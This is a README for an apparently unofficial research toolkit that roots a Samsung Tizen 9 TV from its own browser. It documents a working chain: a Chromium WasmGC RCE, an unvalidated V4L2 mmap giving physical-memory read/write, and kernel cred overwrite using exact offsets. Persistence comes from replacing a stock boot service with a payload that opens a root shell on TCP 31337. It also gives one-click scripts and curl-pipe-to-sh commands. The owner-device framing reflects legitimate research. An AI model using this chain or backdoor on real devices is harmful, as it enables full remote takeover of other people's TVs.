# Samsung Tizen 9 TV Root — Research Notes

Unofficial security research on a 2024 Samsung Neo QLED running **Tizen 9**.
No sdb, no developer mode, no firmware flashing: the TV is rooted from its own
browser, and the root is made persistent through a stock on-boot service app.

**Status 2026-10-22 21:13: ROOTED, PERSISTENT, and the one-click path is verified
end to end from a stock TV.**

The full cycle was run from scratch: `uninstall.ps1` restored stock (IL
`f61f60dd…`, AOT `6c9bdcc4…`, both relabelled, boot row deleted and verified at
0 rows) → reboot → `31337` stayed closed on every check → `root.ps1` on the stock
TV found the kernel and `init_task`, rooted the stub, took the app's label
(`RELABEL=ok`), deployed (`COPY=ok`, `DLL_LABEL=…::RO`, `BOOT_ROW_COUNT=1`) and
the payload was up in RAM seconds later → **reboot → 31337 open again at 47 s**,
`uid=0`, no page load, no PC involvement.

Earlier the same day: an owner-initiated restart also brought root back in 43 s.

**Status 2026-10-22 20:40 (superseded by the above): persistent root — confirmed
by an owner-initiated restart.**

After the owner restarted the TV, the payload's first beacon appeared at
`20:39:37`, it needed one fast-exit/relaunch cycle (v9 by design), and the root
channel was listening at `20:40:20` — **43 s** — with `uid=0` and no browser page
or PC involvement. `uptime` read 1 min, so it was genuinely that boot.

Payload v9 (`ffdb936f…`) sits in the app's `bin/` as the app's own file, the AUL
boot row is present, and `/opt/usr/system/dsh_root_proof.txt` is rewritten by
every boot.

The day's arc: root achieved (02:30), verified on cold boots (15:55), measured at
38 s (16:52), **removed by the verified uninstall test** (16:56), restored at
18:51. The restore needed no kernel-memory work — a root shell takes the app's
SMACK label with `/proc/self/attr/current`, then `deploy.sh` writes the payload
as the app's own file. `server/recover.sh` packages that procedure.

* **Root now:** persistent, `uid=0` on `31337` (~40 s after any boot).
  Fallback if the payload is ever missing: `tools/tv_rootwatch.py` gives a root
  shell on `127.0.0.1:9999`, then run `server/recover.sh` from it.
* **Server:** runs as scheduled task `TV-LabServer`; see `docs/SERVER-HOSTING.md`
  before touching it — a console-hosted server dies silently and the page blanks.
* **Superseded:** the earlier "cannot be reinstalled from the browser lane" and
  "kernel-memory relabel is the only route" statements in `docs/FAILED.md` are
  kept as history; both were resolved at 18:51.
* New tools: `tools/dwarf_offsets.py` (struct offsets from the sim kernel's
  DWARF), `tools/find_task.py` (resumable physical comm scan),
  `tools/smack_relabel.py`, `tools/smack_borrow.py`, `tools/tv_rootwatch.py`.

| | |
|---|---|
| Test unit | 2024 Neo QLED, QNX1D series (QTV T09 platform) |
| Firmware family | `T-PTMDDEUC` (01400) |
| Kernel | Linux 5.4.249, ARM32 LPAE, `PHYS_OFFSET 0x20000000` |
| Browser | Chromium 120.0.6099.5 (`SamsungBrowser/7.0`) |
| Root | `uid=0`, `CapEff=0x3fffffffff` |
| Persistent payload | 19,456 B, md5 `ffdb936f5263a04a26b4727ee8307151` (v9) |
| Root channel | TCP **31337** on the TV (line protocol, reply ends `__END__`) |

> This repo is the **complete toolkit**, not just notes: `server/`, `tools/`,
> `payload/` and the PowerShell entry points are all committed (41 files), so it
> runs without the author's working tree. See [`AGENTS.md`](AGENTS.md) for the
> file list, required tools and reproduction steps.

## The interesting part: a new media (V4L2) physmap

The root does **not** use a GPU CVE, a kernel module bug, `sdb`, or a leaked
service. It uses the TV's **video4linux codec device**: `/dev/video40` lets an
unprivileged process `mmap()` with an attacker-chosen `vm_pgoff`, and the driver
passes that value straight to `remap_pfn_range()` without validating it. The
result is an **arbitrary physical-memory read/write primitive** from the
browser's renderer (`uid 5001`, but a member of group `video`).

That primitive is enough to find the kernel image, walk `init_task`, locate the
calling thread and overwrite its `cred` — no kernel exploit, no ROP chain in
kernel space, no signed module. See [`docs/EXPLOIT.md`](docs/EXPLOIT.md).

## Chain at a glance

1. **Browser RCE** — CVE-2024-2887 (WasmGC type confusion) in Chromium 120:
   arbitrary read/write and ARM shellcode execution inside the renderer.
2. **Physmap** — `/dev/video40` `mmap` with an arbitrary page offset →
   arbitrary physical R/W. An in-renderer ARM stub exposes it over TCP.
3. **Kernel discovery** — kernel Image at phys `0x20008000`, `init_task` at
   `0xC0957180`, task list offset `0x23C`, `cred` at task + `0x3F8`.
4. **Root** — fork a child as a landmark, follow its `real_parent` pointer to
   our task, zero uid..fsgid and set permitted/effective caps to all.
5. **Permanent root** — replace the IL of the stock `app_onboot` service
   `com.samsung.tv.MultiControl-Service` with a .NET payload that repeats the
   physmap/cred patch at every boot, closes `/dev/video40`, and serves a root
   command channel on TCP 31337. The replacement DLL must be given the app's
   SMACK label (`User::Pkg::com.samsung.tv.MultiControl-Service::RO`): a file
   written by the browser keeps the browser's label, and the app is then denied
   read on its own assembly. `server/deploy.sh` sets and verifies it.

## Contents

- [`docs/EXPLOIT.md`](docs/EXPLOIT.md) — how the chain works, stage by stage,
  with the firmware-specific constants.
- [`docs/ROOT-METHODS.md`](docs/ROOT-METHODS.md) — every root/persistence method
  evaluated, what was new, and the method that won.
- [`docs/FAILED.md`](docs/FAILED.md) — what did not work and why (important:
  saves a future researcher weeks).
- [`docs/REMOTE.md`](docs/REMOTE.md) — remote control / hotkey remapping
  investigation (which component maps the app buttons, and how to repoint one).
- [`docs/SCRIPT-REVIEW.md`](docs/SCRIPT-REVIEW.md) — production-readiness audit
  of the scripts: what was hardened, what remains risky.
- [`docs/PORTABILITY.md`](docs/PORTABILITY.md) — running this on a different
  Tizen 9 TV: the four gates, what to re-measure, what transfers unchanged.
- [`AGENTS.md`](AGENTS.md) — hand-off for an AI agent or human: tools, files,
  procedure, verification, traps, recovery.

Runtime output is kept out of the toolkit directory: the server writes
`server/logs/shell.log`, `server/logs/beacons.log` and the page's `/save` dumps
under `server/logs/tv/` (newest 100 kept), and `root.ps1` redirects the server's
stdout/stderr into `server/logs/`. `logs/` is git-ignored and is never served
over HTTP.

What is *not* in the repo: runtime logs, `payload/obj|out` build output,
`__pycache__`, and the per-host `server/deploy_local.sh` — a fresh clone is 36
files (~380 KB). `server/payload.dll` **is** included (18 KB) so the toolkit runs
without a .NET SDK. `.gitattributes` keeps shell scripts LF-only, because the TV
runs them under busybox `sh`.

## Requirements to reproduce

- The same TV family/firmware generation (the physmap depends on the codec
  driver and the 32-bit LPAE kernel layout).
- A PC on the same LAN, able to receive TCP/80 from the TV and reach TCP/31337
  on the TV.
- Python 3 on the PC (the port-80 server must run under an interpreter the
  Windows firewall allows).
- .NET SDK 6+ only if you rebuild the boot payload.

## Compatibility — other Tizen 9 TVs?

The chain has independent layers, and each can fail on a different model:

| Layer | Depends on | Portability |
|---|---|---|
| Browser RCE | CVE-2024-2887 (Chromium ~120) | Dies on a browser update/newer firmware |
| Physmap | Samsung media driver accepting an arbitrary `vm_pgoff` | Possibly shared across the same SoC/kernel generation; must be tested |
| Constants | Image base, `init_task`, task/cred offsets | Per kernel build; re-measure |
| Persistence | A dotnet-inhouse `app_onboot` app on writable `/opt` with the AOT/IL behaviour | Per model/app; verify |

**Verdict: the method is portable, the build is not.** As shipped, `payload.dll`
hardcodes this kernel's `PHYS_OFFSET`, `init_task` and four `task_struct`
offsets, so it will not root a different TV unchanged. What *does* transfer is
the design (browser RCE → V4L2 physmap → cred patch → on-boot app payload), the
server, the channel protocol and the recovery scripts.

For another Tizen 9 TV, the order of work is:

1. **Browser gate** — open [`server/probe.html`](server/probe.html) on it (safe,
   runs nothing) and check the UA/`WASM_GC` the server logs. CVE-2024-2887 is
   Chromium-120-specific; a store-updated browser is the usual reason this ends
   here.
2. **Physmap gate** — once you have any code execution, check `/dev/video*` and
   whether the driver accepts an arbitrary `vm_pgoff`.
3. **Constants** — re-measure the kernel base, `init_task` and the struct
   offsets (GPL source + `tools/dwarf_offsets.py`), then rebuild the payload.
4. **Carrier** — find a dotnet-inhouse `app_onboot` app on writable `/opt`.

Full protocol, and the two traps that cost the most time here (vmalloc addresses,
and an app whose process name is not its app id): [`docs/PORTABILITY.md`](docs/PORTABILITY.md).
Test on hardware you can afford to brick, and keep the stock DLL/AOT backups
`deploy.sh` makes.

## Is it a one-click script?

Almost. [`root.ps1`](root.ps1) automates everything on the PC:

```powershell
pwsh -File .\root.ps1 -TvIp <tv-ip>
```

It resolves the toolkit (local `tools/` + `server/`, or `-ToolkitDir`), starts
the server (or reuses one already serving this directory; `-RestartServer`
replaces a different server on `:80`), prints the TV URL, waits for the page's
stub, roots it, deploys the payload, and after the reboot waits for TCP 31337
and prints `id`. `-DryRun` shows the plan without touching anything.

Two manual steps remain, both on the TV remote:

1. open `http://<HOST_IP>/index.html` (wait for `RUNNING`);
2. reboot the TV after the deploy.

The script prints this as a numbered prompt ("**1) ON THE TV …**") and repeats
a reminder with the URL every 30 seconds until the page connects, so a person
who starts it and walks away still knows the TV is waiting for them. After the
deploy it prints "Reboot the TV now" and then waits for 31337 itself.

**What you will see:** on the TV, the page reaches `RUNNING` and then stops
updating (and may freeze — that is expected: the ARM stub owns the socket, so
the page cannot report success). On the PC, the script prints the deploy output
(`UID=0 … COPY=ok … DEPLOY_DONE`), then the reboot prompt, and after the reboot
`Permanent root is up:` followed by `uid=0(root) …`.

Caveat: the browser payload has the host IP **baked into the ARM shellcode**.
`root.ps1` rewrites only the TV-side deploy script; if your PC IP differs from
the one the page was built for, rebuild `tools/physrpc.S` with
`tools/build_physrpc.py` and re-embed the shellcode in
`server/payloads/browser_payload.js` first.

## Uninstalling — restore stock

```powershell
pwsh -File .\uninstall.ps1 -TvIp <tv-ip>
```

It uses the root channel (TCP 31337) to run `server/uninstall.sh` as root,
which:

- restores `bin/MultiControlService.dll` from `share/mcs_orig.dll`
  (md5-verified against the known stock hash),
- restores the AOT image from `share/mcs_ni_orig.dll` into `bin/.native_image/`,
- deletes the injected `boot_sequence` row from `.appsvc.db`
  (`-KeepBoot` leaves it, so the app still starts at boot but as stock),
- removes `payload_backup.dll` and our `/tmp` leftovers.

Then reboot. The script waits for 31337 to close, waits for the TV to come back,
and confirms the channel stays closed. The running app keeps the payload in
memory until the reboot, so 31337 stays open until then — that is expected.

If the channel is down but the TV is rooted through the browser path,
`uninstall.ps1` prints the manual fallback: load `index.html`,
`kernel_root.py --fork`, then
`run_root.py "curl -s http://<HOST_IP>/uninstall.sh | sh"`.

`-DryRun` shows the plan without touching anything.

## Safety and legal

- Use only on hardware you own. Rooting voids the warranty; a bad write to the
  wrong physical page can crash or brick the set.
- The boot payload has a device-exclusive resource (`/dev/video40` allows one
  RDWR opener). It closes it after rooting so the browser path keeps working.
- Keep the original `mcs_orig.dll` / `mcs_ni_orig.dll` backups and leave TV
  auto-update **off**; an OTA can replace the app and undo persistence.
- No Samsung firmware, proprietary images or dumps are distributed here.
- Provided as-is, without warranty, for security research and interoperability
  on devices you own.

## Acknowledgements

Standing on public work by:

- **hdbreaker** — the `samsung-smarttv-tizen-9-chromium-120-v8-rce` browser
  chain (CVE-2024-2887 + WasmGC) that gets code execution on Tizen 9.
- **levkropp** — the boot-agent shape (on-boot app + V4L2 physmap).
- **califio / MADBugs** — the `/dev/ntksys` physmap-to-cred technique on older
  Samsung TVs, the direct ancestor of this approach.
- **DemonKingSwarn**, **chris-ritsen**, **invaliddayta** — Tizen root/debloat
  research and tooling.
- **theubusu (unixtract)**, **gtors (vdfs-unpack)** — firmware decryption and
  VDFS4 extraction used during the research.

Samsung and Tizen are trademarks of Samsung Electronics. This project is
unofficial and not affiliated with or endorsed by Samsung.

* **Recovery:** `server/recover.sh` — paste it into a root shell on the TV
  (`curl -s http://<pc>/recover.sh | sh`) to reinstall the payload end-to-end: it
  takes the app's SMACK label via `/proc/self/attr/current`, runs `deploy.sh`, and
  `deploy.sh` restarts the app so the new DLL loads. Verified 2026-10-22 18:51 on
  a cold boot (31337 in 41 s, no PC involvement).